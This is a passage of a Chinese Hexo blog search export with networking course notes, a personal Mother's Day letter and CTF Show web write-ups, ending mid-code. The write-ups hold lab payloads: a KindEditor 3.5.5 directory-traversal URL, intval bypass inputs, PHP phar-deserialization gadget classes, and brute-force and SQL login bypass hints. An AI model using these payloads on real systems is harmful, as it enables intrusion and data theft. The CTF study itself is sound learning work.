<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.7 计算机网络的体系结构</title>
    <url>/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7 计算机网络的体系结构"></a>1.7 计算机网络的体系结构</h1><ul>
<li>ISO 国际标准化组织</li>
<li>OSI / RM  互连网法律上的国际标准</li>
<li>TCP / IP 因特网事实上的国际标准</li>
<li>网络协议  Network Protocols   数据交换存寿的规则、标准与约定</li>
<li>网络体系结构  计算机网络各层及其协议的集合</li>
</ul>
<h2 id="1-7-1-OSI-七层模型"><a href="#1-7-1-OSI-七层模型" class="headerlink" title="1.7.1 OSI 七层模型"></a>1.7.1 OSI 七层模型</h2><p><strong>开放式系统互联通信参考模型</strong>（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为  <em>OSI模型</em>（OSI model），一种 <em>概念模型</em>，由 <em>国际标准化组织</em> 提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。</p>
<p><strong>应用层</strong>：可以产生流量，可以与用户进行交互的应用程序</p>
<p><strong>表示层</strong>：是否加密？ 是否压缩？  编码问题？  开发人员需要考虑的问题</p>
<p><strong>会话层</strong>：服务端与客户端建立的会话   可查看木马：<code>netstat -nb </code></p>
<p>​    例如：远程桌面建立会话</p>
<blockquote>
<p>192.168.158.1   远程连接    192.168.158.115</p>
</blockquote>
<ul>
<li><p>对 192.168.158.115 进行端口查看，可以看到 存在远程桌面的会话</p>
<p><code>netstat -an</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/07/hFeXnqdbw1MSTNI.png" alt="image-20211007175448711"></p>
<ul>
<li><p>进一步 进行 “木马” 查看：</p>
<p><code>netstat -nb</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/07/eYxl8Gr1UKgtuho.png" alt="image-20211007175644564"></p>
<p>例：当想查看当前计算机中是否存在木马，可以打开电脑，不进行任何操作，即无流量传输，后 命令 <code>netstat -nb</code>  ，查看进程。</p>
<p><strong>传输层：</strong>可靠传输（建立会话），不可靠传输（不建立会话），流量控制</p>
<p><strong>网络层：</strong>IP地址编址，选择最佳路径（动态路由协议）</p>
<p><strong>数据链路层：</strong>规定数据如何封装，添加物理层地址（MAC 地址）</p>
<p><strong>物理层：</strong>电压、接口标准</p>
<blockquote>
<p><strong>应用举例：</strong></p>
<p>​    <strong>网络排错</strong>：分层检查：从最底层开始向上逐一排查</p>
<pre><code>1. 网线是否插好？（物理层）
2.  IP地址 检查 （网络层）
3. 浏览器 恶意插件？（应用层）
</code></pre>
<p>终极：重装，重启，格式化</p>
</blockquote>
<blockquote>
<p><strong>网络安全与 OSI 参考模型</strong></p>
<ol>
<li>物理层安全     设置 <em>交换机</em> 某接口禁止 外来用户 的连接</li>
<li>数据链路层安全   ADSL、AP密码</li>
<li>网络层安全    设置 <em>路由器</em> 某接口 禁止外来用户 的连接</li>
<li>应用层安全      SQL注入、文件上传、文件包含等等 应用层漏洞、各种攻击手段等</li>
</ol>
</blockquote>
<h2 id="1-7-2-TCP-IP-四层模型"><a href="#1-7-2-TCP-IP-四层模型" class="headerlink" title="1.7.2 TCP/IP 四层模型"></a>1.7.2 TCP/IP 四层模型</h2><p><strong>应用层</strong>   （包括了 表示层、会话层）</p>
<p><strong>传输层</strong></p>
<p><strong>网络层</strong></p>
<p>**网络接口层 **  （包括了 数据链路层、物理层）</p>
<h2 id="1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程"><a href="#1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程" class="headerlink" title="1.7.3 五层协议  对应 数据单元  以及 数据简单 运输过程"></a>1.7.3 五层协议  对应 <code>数据单元</code>  以及 <code>数据简单 运输过程</code></h2><p><strong>应用层</strong>             传输数据单元：PDU</p>
<p>**传输层    **         运输层 报文   <code>加 TCP/UDP</code></p>
<p><strong>网络层</strong>             IP 数据包 （IP 分组）  <code>加 IP 地址</code></p>
<p><strong>数据链路层</strong>      数据帧   <code>加 MAC 地址，加帧头帧尾 </code> </p>
<p><strong>物理层</strong>              比特流  bit  (01构成)    </p>
<p><img src="https://i.loli.net/2021/10/08/h5k2MJC7V6KS3wb.png" alt="image-20211008194422314"></p>
<p> <img src="https://i.loli.net/2021/10/08/bfYMdNl1crxivny.png" alt="image-20211008194507335"></p>
<h2 id="1-7-4-基本概念"><a href="#1-7-4-基本概念" class="headerlink" title="1.7.4 基本概念"></a>1.7.4 基本概念</h2><p><strong>实体 entity</strong> ：交换信息或软件进程</p>
<p><strong>协议 protocol</strong> ：控制两个对等实体通信的规则</p>
<p><strong>服务 service</strong> ：下层向上层提供服务，上层需要使用下层提供的服务来实现本层的功能</p>
<p><strong>服务访问点 SAP</strong> ：相邻两层实体之间交换信息的地方</p>
<p><img src="https://i.loli.net/2021/10/08/RexqQ58rS27CJ19.png" alt="image-20211008193707527"></p>
<h2 id="1-7-5-实操"><a href="#1-7-5-实操" class="headerlink" title="1.7.5 实操"></a>1.7.5 实操</h2><p><strong>查看本地网络连接网速：</strong></p>
<blockquote>
<p>测试：windows 7 </p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/EOCmnvh81937pGQ.png" alt="image-20211008195814866"></p>
<p>自动协商是根据双方速率进行自动设置，如果强制设置为与另一方速率不匹配的网速，则无法正常进行通信。</p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计网</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年的母亲节</title>
    <url>/2021/05/09/2021%E5%B9%B4%E7%9A%84%E6%AF%8D%E4%BA%B2%E8%8A%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​    从前我总是不曾在意一些节日，就连身边人的生日也从不上心，也许是离家久了，也许了自己长大了许多，也许是自己在害怕些什么，也许是自己突然意识到某些东西它并不是一成不变的，到了今年今日，我再也无法对这些节日避讳，我意识到，今天过后，我需要做出一些改变。</p>
<p>​    以下是我想对她说的话：</p>
<blockquote>
<p>母亲节到了，你要当一个乖一点的妈妈，<br>多陪我聊聊天；<br>多学着做一些好吃的饭；<br>多多把我的房间打扫的干干净净；<br>多多听一些我推荐给你的歌；<br>多多听我劳力唠叨，抱怨这抱怨那；<br>多多听我讲我好想讲的话，关于歌手的，关于明星的，关于电视剧的，关于电影的，关于杰哥的，关于学校的，关于朋友的，关于我遇到的好多好多事；<br>多多给我一些预料不到的好吃的；<br>多多身体好一些；<br>多多快乐一些；<br>多多在全民K歌上唱歌；<br>多多和朋友出去散心；<br>多多表达出自己的感情；<br>多多对自己好一点；<br>少吃点泡面，多吃些肉；<br>多多吃你最爱的苹果；<br>多多喝热水；<br>早点睡，晚点起；<br>少想那些乱七八糟的；<br>不用担心我，不用考虑未来（反正一定是跟我在一起的）；<br>就这样吧，也说的挺多了，反正就是，你要记得，做一个乖一点的妈妈哦！</p>
</blockquote>
<p>2021.5.9</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>CTF Show---信息搜集</title>
    <url>/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show 中 web入门，信息搜集篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-—-信息搜集"><a href="#一、CTF-Show-—-信息搜集" class="headerlink" title="一、CTF Show — 信息搜集"></a>一、CTF Show — 信息搜集</h1><h2 id="1-1-Web1-—-查看源代码"><a href="#1-1-Web1-—-查看源代码" class="headerlink" title="1.1 Web1 — 查看源代码"></a>1.1 Web1 — 查看源代码</h2><p>直接查看源代码</p>
<p><img src="https://i.loli.net/2021/07/14/QcVRY3rX9a4USMZ.png" alt="image-20210714105835548"></p>
<h2 id="1-2-Web-2-—-查看源代码"><a href="#1-2-Web-2-—-查看源代码" class="headerlink" title="1.2 Web 2 — 查看源代码"></a>1.2 Web 2 — 查看源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure>

<p><strong>查看源代码的几种方式</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
<h2 id="1-3-Web-3-—-抓包"><a href="#1-3-Web-3-—-抓包" class="headerlink" title="1.3 Web 3 — 抓包"></a>1.3 Web 3 — 抓包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure>

<p>抓包 尝试</p>
<p><img src="https://i.loli.net/2021/07/14/kOtL1lBa8b53pIS.png" alt="image-20210714111126154"></p>
<h2 id="1-4-Web-4-—-robots-txt-泄露"><a href="#1-4-Web-4-—-robots-txt-泄露" class="headerlink" title="1.4 Web 4 — robots.txt 泄露"></a>1.4 Web 4 — robots.txt 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/1t2zsvMoAJTPO3V.png" alt="image-20210714111325675"></p>
<p><img src="https://i.loli.net/2021/07/14/npvowT7mgbIzx2C.png" alt="image-20210714111358421"></p>
<h2 id="1-5-Web-5-—-phps-文件"><a href="#1-5-Web-5-—-phps-文件" class="headerlink" title="1.5 Web 5 — phps 文件"></a>1.5 Web 5 — phps 文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong>phps文件</strong></p>
<p> ​    就是php的 <strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p>
<p> ​    它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/m2Mex6SziNTg7EW.png" alt="image-20210714111652581"></p>
<p><img src="https://i.loli.net/2021/07/14/wRkJOuGiavhnM7N.png" alt="image-20210714111806962"></p>
<h2 id="1-6-Web-6-—-www-zip-泄露"><a href="#1-6-Web-6-—-www-zip-泄露" class="headerlink" title="1.6 Web 6 — www.zip 泄露"></a>1.6 Web 6 — <a href="http://www.zip/">www.zip</a> 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/9NrWGukdyw5EVMX.png" alt="image-20210714111959516"></p>
<p><img src="https://i.loli.net/2021/07/14/uZqlnDYc3SFaAMC.png" alt="image-20210714113312486"></p>
<p><img src="https://i.loli.net/2021/07/14/xWMmasCKAd91Pfq.png" alt="image-20210714113251749"></p>
<h2 id="1-7-Web-7-—-版本控制-git"><a href="#1-7-Web-7-—-版本控制-git" class="headerlink" title="1.7 Web 7 — 版本控制 .git"></a>1.7 Web 7 — 版本控制 <code>.git</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/mWX7dRU4ntLrFZs.png" alt="image-20210714150846912"></p>
<h2 id="1-8-Web-8-—-版本控制-svn"><a href="#1-8-Web-8-—-版本控制-svn" class="headerlink" title="1.8 Web 8 — 版本控制 .svn"></a>1.8 Web 8 — 版本控制 <code>.svn</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/DZMXJGrz7fAC9ju.png" alt="image-20210714152837039"></p>
<h2 id="1-9-Web-9-—-vim-临时文件缓存"><a href="#1-9-Web-9-—-vim-临时文件缓存" class="headerlink" title="1.9 Web 9 — vim 临时文件缓存"></a>1.9 Web 9 — vim 临时文件缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure>

<p><strong>Vim 缓存</strong></p>
<blockquote>
<p>​    <strong>临时文件</strong> 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动</p>
<p>删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可</p>
<p>以通过缓存文件恢复原始文件内容</p>
<p>​    <strong>以 index.php 为例</strong> </p>
<ol>
<li><p>第一次产生的缓存文件名为 <code>.index.php.swp</code></p>
</li>
<li><p>第二次意外退出后，文件名为 <code>.index.php.swo</code></p>
</li>
<li><p>第三次产生的缓存文件则为 <code>.index.php.swn</code></p>
</li>
</ol>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/AJUYaWD9ImPz7bF.png" alt="image-20210714153426274"></p>
<h2 id="1-10-Web-10-—-cookie-泄露"><a href="#1-10-Web-10-—-cookie-泄露" class="headerlink" title="1.10 Web 10 — cookie 泄露"></a>1.10 Web 10 — cookie 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/3R6u9WMdatXgSOv.png" alt="image-20210714154500245"></p>
<h2 id="1-11-Web-11-—-域名解析查询"><a href="#1-11-Web-11-—-域名解析查询" class="headerlink" title="1.11 Web 11 — 域名解析查询"></a>1.11 Web 11 — 域名解析查询</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></table></figure>

<p><strong>查看域名解析</strong></p>
<ul>
<li><p><code>nslookup</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -qt=txt ctfshow.com</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type:    A 				--&gt;地址记录    AAAA   			--&gt;地址记录    AFSDB Andrew    --&gt;文件系统数据库服务器记录    ATMA 			--&gt;ATM地址记录    CNAME  			--&gt;别名记录    HINHO 		 	--&gt;硬件配置记录，包括CPU、操作系统信息     ISDN   			--&gt;域名对应的ISDN号码    MB  	 		--&gt;存放指定邮箱的服务器    MG    			--&gt;邮件组记录    MINFO   		--&gt;邮件组和邮箱的信息记录    MR   			--&gt;改名的邮箱记录    MX   			--&gt;邮件服务器记录    NS 				--&gt; 名字服务器记录    PTR    			--&gt;反向记录    RP   			--&gt;负责人记录    RT  			--&gt;路由穿透记录    SRV    			--&gt;TCP服务器信息记录    TXT   			--&gt;域名对应的文本信息    X25  			--&gt;域名对应的X.25地址记录</span></span><br></pre></td></tr></table></figure></li>
<li><p>在线历史解析记录查询</p>
<p><img src="https://i.loli.net/2021/07/14/knpAHlIUJx7zyYK.png" alt="image-20210714155814946"></p>
</li>
<li><p>阿里云 DNS 检测</p>
<p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p>
<p><img src="https://i.loli.net/2021/07/14/yef6FBRPSJTgoKw.png" alt="image-20210714170535242"></p>
</li>
</ul>
<h2 id="1-12-Web-12-—-网站公开信息"><a href="#1-12-Web-12-—-网站公开信息" class="headerlink" title="1.12 Web 12 — 网站公开信息"></a>1.12 Web 12 — 网站公开信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/hjlGXmsgyWSYrwf.png" alt="image-20210714171715223"></p>
<p><img src="https://i.loli.net/2021/07/14/eqwKlZuvLd2PJX8.png" alt="image-20210714171804528"></p>
<h2 id="1-13-Web-13-—-网站技术文档"><a href="#1-13-Web-13-—-网站技术文档" class="headerlink" title="1.13 Web 13 — 网站技术文档"></a>1.13 Web 13 — 网站技术文档</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/R2degLa3pzZKuni.png" alt="image-20210714172026755"></p>
<p><img src="https://i.loli.net/2021/07/14/lcYNRWCgMmvZaPw.png" alt="image-20210714172038292"></p>
<p><img src="https://i.loli.net/2021/07/14/lcpfsX1RWYOA3zP.png" alt="image-20210714172215536"></p>
<h2 id="1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）"><a href="#1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）" class="headerlink" title="1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）"></a>1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</span><br></pre></td></tr></table></figure>

<p><strong>KindEditor 3.5.5 遍历目录漏洞</strong>        <a href="http://www.nxadmin.com/web/96.html">http://www.nxadmin.com/web/96.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload/url/editor/php/file_manager_json.php?path=/	#可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/27sLANSvX83kgRw.png" alt="image-20210715100641820"></p>
<p><img src="https://i.loli.net/2021/07/15/y9mVSprWKqZFPGT.png" alt="image-20210715100746950"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/rF2dO9o3JD8cVCx.png" alt="image-20210715100941439"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/xPqTEnG4DrLtIwy.png" alt="image-20210715101127445"></p>
<p>拓展：<a href="https://blog.csdn.net/u011781521/article/details/59057759/">编辑器漏洞</a></p>
<h2 id="1-15-Web-15-—-前端邮箱信息泄露"><a href="#1-15-Web-15-—-前端邮箱信息泄露" class="headerlink" title="1.15 Web 15 — 前端邮箱信息泄露"></a>1.15 Web 15 — 前端邮箱信息泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>

<p>前端页面当中找到邮箱信息</p>
<p><img src="https://i.loli.net/2021/07/14/NqisDzZkouH2Oyb.png" alt="image-20210714173643444"></p>
<p><img src="https://i.loli.net/2021/07/14/Gzt8XqyCpu5drMk.png" alt="image-20210714173940662"></p>
<p>忘记密码 密保答案 西安 </p>
<p>成功重置密码</p>
<p>成功登录 拿到 flag</p>
<h2 id="1-16-Web-16-—-探针信息"><a href="#1-16-Web-16-—-探针信息" class="headerlink" title="1.16 Web 16 — 探针信息"></a>1.16 Web 16 — 探针信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>

<p><strong>PHP 探针</strong></p>
<blockquote>
<p>​    <strong>php探针</strong> 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E7%9B%98/486482">服务器硬盘</a>资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p>
</blockquote>
<p><a href="https://www.laozuo.org/16305.html">常用4款PHP探针</a></p>
<p>应该是雅黑探针，访问 <code>/tz.php</code></p>
<p><img src="https://i.loli.net/2021/07/14/Yb2xc5XQIrMFopy.png" alt="image-20210714213514783"></p>
<p>查找 <code>ctfshow</code> 即可</p>
<h2 id="1-17-Web-17-—-绕过-CDN-查-IP"><a href="#1-17-Web-17-—-绕过-CDN-查-IP" class="headerlink" title="1.17 Web 17 — 绕过 CDN 查 IP"></a>1.17 Web 17 — 绕过 CDN 查 IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </span><br></pre></td></tr></table></figure>

<p>全球 ping 可知：无 CDN </p>
<p>查 <code>www.ctfshow.com</code> 的 IP，即为 ctfer.com的真实IP</p>
<h2 id="1-18-Web-18-—-前端-js-泄露"><a href="#1-18-Web-18-—-前端-js-泄露" class="headerlink" title="1.18 Web 18 — 前端 js 泄露"></a>1.18 Web 18 — 前端 js 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure>

<p>查看源码，发现 <code>Flappy_js.j</code></p>
<p><img src="https://i.loli.net/2021/07/14/JzW2SpRsToZ91FA.png" alt="image-20210714180947784"></p>
<p>unicode 解码</p>
<p><img src="https://i.loli.net/2021/07/14/8H1RKnwdOsVSoY6.png" alt="image-20210714181055283"></p>
<p>访问 <code>110.php</code></p>
<p><img src="https://i.loli.net/2021/10/01/GP8DOvbLRjIf4yC.png" alt="image-20210714181154250"></p>
<h2 id="1-19-Web-19-—-前端密钥泄露"><a href="#1-19-Web-19-—-前端密钥泄露" class="headerlink" title="1.19 Web 19 — 前端密钥泄露"></a>1.19 Web 19 — 前端密钥泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>查看源码得到</p>
<p><img src="https://i.loli.net/2021/10/01/Wah8ZeLOXHFm1lw.png" alt="image-20210714181430721"></p>
<p>会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子</p>
<p><img src="https://i.loli.net/2021/07/14/xOsDeocflHvaiu6.png" alt="image-20210714181906722"></p>
<h2 id="1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露"><a href="#1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露" class="headerlink" title="1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露"></a>1.20 Web 20 — 早期 asp+access <code>/db/db.mdb</code> 文件泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/iFHty9PwMOAcWQb.png" alt="image-20210714182153060"></p>
<h2 id="1-21-Web-382-—"><a href="#1-21-Web-382-—" class="headerlink" title="1.21 Web 382 —"></a>1.21 Web 382 —</h2><p>首先查看源代码</p>
<p><img src="https://i.loli.net/2021/08/03/J71pYxy4QUmt2eM.png" alt="image-20210803095937572"></p>
<p>可以一一进行尝试，最后发现 <code>http://url/alsckdfy/</code> 竟然是网站的后台登录页面    </p>
<ul>
<li>爆破 弱密码</li>
<li>sql 万能密码</li>
</ul>
<p>成功登录之后即可获得 flag</p>
<h1 id="二、做题总结"><a href="#二、做题总结" class="headerlink" title="二、做题总结"></a>二、做题总结</h1><ul>
<li><p>第一步：查看 <strong>源代码</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
</li>
<li><p><strong>抓包</strong> 可能发现一些有用信息</p>
</li>
<li><p><strong>robots.txt</strong> </p>
</li>
<li><p><strong>phps</strong> 源代码泄露</p>
</li>
<li><p>下载源码文件、网站备份文件</p>
</li>
<li><p>版本控制不要部署到生产环境中 <code>.git  .svn</code></p>
</li>
<li><p><strong>Vim 缓存</strong>    <code>.文件名.php.swp  .文件名.php.swo  .文件名.php.swn</code></p>
</li>
<li><p>cookie 的重要性</p>
</li>
<li><p>域名、子域名 信息搜集    <code>nslookup   在线网站</code></p>
</li>
<li><p>Banner 等公开信息   <code>管理员密码  QQ  QQ邮箱等  第三方软件查个人信息</code></p>
</li>
<li><p>技术文档</p>
</li>
<li><p>对应编辑器漏洞</p>
</li>
<li><p>探针</p>
</li>
<li><p>前端源码 密钥泄露</p>
</li>
<li><p><strong>db.mdb</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-吃瓜杯</title>
    <url>/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show 吃瓜杯篇。</p>
<span id="more"></span>

<h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure>

<h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p>
<p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p>
<p>上传成功发现：序列化与反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun 